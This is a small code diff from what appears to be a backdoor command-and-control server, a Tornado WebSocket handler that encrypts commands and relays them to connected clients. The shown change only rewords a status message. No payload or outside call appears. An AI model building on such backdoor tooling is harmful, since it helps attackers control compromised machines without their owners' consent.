@@ -81,7 +81,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                             msg_json = json.dumps(msg)
                             to_client.write_message(to_client.encrypt(msg_json))
                             self.jobs.append([msg_json, 'Running'])
-                            self.send_data('OK.\n')
+                            self.send_data('Send command to client success.\n')
 
                         else:
                             self.send_data('Should not send control command to controller.\n')
